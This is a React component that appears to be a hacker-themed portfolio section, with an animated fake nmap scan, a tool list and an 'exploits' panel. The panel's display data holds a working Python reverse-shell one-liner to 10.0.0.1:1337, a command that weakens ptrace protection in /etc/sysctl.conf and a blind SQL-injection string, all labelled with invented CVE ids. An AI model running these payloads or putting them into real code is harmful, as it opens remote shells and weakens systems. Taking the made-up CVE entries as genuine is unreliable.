"use client"

import { motion } from "framer-motion"
import { useState } from "react"
import { HolographicCard } from "./holographic-card"
import { CyberButton } from "./cyber-button"

const exploits = [
  {
    id: "CVE-2024-1337",
    name: "Buffer Overflow in Legacy System",
    severity: "CRITICAL",
    description: "Remote code execution vulnerability in legacy authentication system",
    payload:
      "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"",
    tools: ["Metasploit", "Burp Suite", "Nmap", "Wireshark"],
    status: "EXPLOITED",
  },
  {
    id: "CVE-2024-0day",
    name: "Privilege Escalation via Kernel Module",
    severity: "HIGH",
    description: "Local privilege escalation through vulnerable kernel driver",
    payload: "echo 'kernel.yama.ptrace_scope = 0' >> /etc/sysctl.conf && sysctl -p",
    tools: ["GDB", "Radare2", "Ghidra", "IDA Pro"],
    status: "RESEARCHING",
  },
  {
    id: "CVE-2024-SQL",
    name: "SQL Injection in Web Application",
    severity: "MEDIUM",
    description: "Time-based blind SQL injection in user authentication",
    payload: "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",
    tools: ["SQLMap", "Burp Suite", "OWASP ZAP", "Nikto"],
    status: "PATCHED",
  },
]

const hackingTools = [
  { name: "Kali Linux", icon: "🐉", description: "Primary penetration testing OS" },
  { name: "Metasploit", icon: "💥", description: "Exploitation framework" },
  { name: "Burp Suite", icon: "🕷️", description: "Web application security testing" },
  { name: "Nmap", icon: "🗺️", description: "Network discovery and security auditing" },
  { name: "Wireshark", icon: "🦈", description: "Network protocol analyzer" },
  { name: "John the Ripper", icon: "🔨", description: "Password cracking tool" },
  { name: "Aircrack-ng", icon: "📡", description: "WiFi security auditing" },
  { name: "Hydra", icon: "🐙", description: "Login cracker" },
  { name: "Ghidra", icon: "👻", description: "Reverse engineering framework" },
  { name: "Radare2", icon: "⚡", description: "Binary analysis framework" },
]

export function ExploitsSection() {
  const [selectedExploit, setSelectedExploit] = useState(0)
  const [scanningActive, setScanningActive] = useState(false)

  const startScan = () => {
    setScanningActive(true)
    setTimeout(() => setScanningActive(false), 5000)
  }

  return (
    <section id="exploits" className="py-20 px-4">
      <div className="max-w-7xl mx-auto">
        <motion.h2
          className="text-6xl font-bold text-center mb-16 text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-orange-400"
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
        >
          {"# cat /var/log/exploits.log"}
        </motion.h2>

        {/* Vulnerability Scanner */}
        <motion.div
          className="mb-16"
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
        >
          <HolographicCard className="p-8">
            <div className="text-center mb-6">
              <h3 className="text-2xl font-bold text-red-400 mb-4">VULNERABILITY SCANNER</h3>
              <CyberButton onClick={startScan} variant="primary">
                {scanningActive ? "SCANNING..." : "nmap -sS -O target.com"}
              </CyberButton>
            </div>

            {scanningActive && (
              <motion.div
                className="font-mono text-sm text-green-400"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                <div className="mb-2">Starting Nmap 7.94 ( https://nmap.org )</div>
                <div className="mb-2">Initiating SYN Stealth Scan at 2024-01-01 13:37</div>
                <div className="mb-2">Scanning target.com (192.168.1.100) [1000 ports]</div>
                <div className="mb-2 text-yellow-400">Discovered open port 22/tcp on 192.168.1.100</div>
                <div className="mb-2 text-yellow-400">Discovered open port 80/tcp on 192.168.1.100</div>
                <div className="mb-2 text-red-400">Discovered open port 1337/tcp on 192.168.1.100</div>
                <div className="mb-2">Completed SYN Stealth Scan at 13:37, 2.50s elapsed (1000 total ports)</div>
                <div className="text-cyan-400">Nmap scan report for target.com (192.168.1.100)</div>
              </motion.div>
            )}
          </HolographicCard>
        </motion.div>

        {/* Exploits Database */}
        <div className="grid lg:grid-cols-2 gap-8 mb-16">
          <div className="space-y-4">
            <h3 className="text-2xl font-bold text-red-400 mb-4"># searchsploit -t remote</h3>
            {exploits.map((exploit, index) => (
              <motion.div
                key={exploit.id}
                initial={{ opacity: 0, x: -50 }}
                whileInView={{ opacity: 1, x: 0 }}
                viewport={{ once: true }}
                transition={{ delay: index * 0.1 }}
              >
                <HolographicCard
                  className={`p-4 cursor-pointer transition-all duration-300 ${
                    selectedExploit === index ? "scale-105 border-red-400" : ""
                  }`}
                  onClick={() => setSelectedExploit(index)}
                >
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-bold text-white">{exploit.id}</h4>
                    <span
                      className={`px-2 py-1 rounded text-xs ${
                        exploit.severity === "CRITICAL"
                          ? "bg-red-500"
                          : exploit.severity === "HIGH"
                            ? "bg-orange-500"
                            : "bg-yellow-500"
                      }`}
                    >
                      {exploit.severity}
                    </span>
                  </div>
                  <p className="text-sm text-gray-300 mb-2">{exploit.name}</p>
                  <div className="flex justify-between items-center">
                    <span className="text-xs text-gray-400">{exploit.description}</span>
                    <span
                      className={`text-xs px-2 py-1 rounded ${
                        exploit.status === "EXPLOITED"
                          ? "bg-red-500/20 text-red-400"
                          : exploit.status === "RESEARCHING"
                            ? "bg-yellow-500/20 text-yellow-400"
                            : "bg-green-500/20 text-green-400"
                      }`}
                    >
                      {exploit.status}
                    </span>
                  </div>
                </HolographicCard>
              </motion.div>
            ))}
          </div>

          <motion.div
            key={selectedExploit}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <HolographicCard className="p-6">
              <h4 className="text-xl font-bold text-red-400 mb-4">EXPLOIT DETAILS</h4>
              <div className="space-y-4">
                <div>
                  <span className="text-cyan-400 font-bold">ID:</span>
                  <span className="ml-2">{exploits[selectedExploit].id}</span>
                </div>
                <div>
                  <span className="text-cyan-400 font-bold">Name:</span>
                  <span className="ml-2">{exploits[selectedExploit].name}</span>
                </div>
                <div>
                  <span className="text-cyan-400 font-bold">Description:</span>
                  <p className="mt-1 text-gray-300">{exploits[selectedExploit].description}</p>
                </div>
                <div>
                  <span className="text-cyan-400 font-bold">Payload:</span>
                  <div className="mt-2 bg-black/50 p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
                    {exploits[selectedExploit].payload}
                  </div>
                </div>
                <div>
                  <span className="text-cyan-400 font-bold">Tools Used:</span>
                  <div className="flex flex-wrap gap-2 mt-2">
                    {exploits[selectedExploit].tools.map((tool) => (
                      <span key={tool} className="px-2 py-1 bg-purple-400/20 text-purple-400 rounded text-sm">
                        {tool}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            </HolographicCard>
          </motion.div>
        </div>

        {/* Hacking Arsenal */}
        <motion.div initial={{ opacity: 0, y: 50 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}>
          <h3 className="text-2xl font-bold text-center text-purple-400 mb-8"># ls /usr/bin/hacking-tools/</h3>
          <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
            {hackingTools.map((tool, index) => (
              <motion.div
                key={tool.name}
                initial={{ opacity: 0, scale: 0 }}
                whileInView={{ opacity: 1, scale: 1 }}
                viewport={{ once: true }}
                transition={{ delay: index * 0.1 }}
              >
                <HolographicCard className="p-4 text-center hover:scale-105 transition-transform">
                  <div className="text-3xl mb-2">{tool.icon}</div>
                  <div className="font-bold text-white text-sm">{tool.name}</div>
                  <div className="text-xs text-gray-400 mt-1">{tool.description}</div>
                </HolographicCard>
              </motion.div>
            ))}
          </div>
        </motion.div>
      </div>
    </section>
  )
}
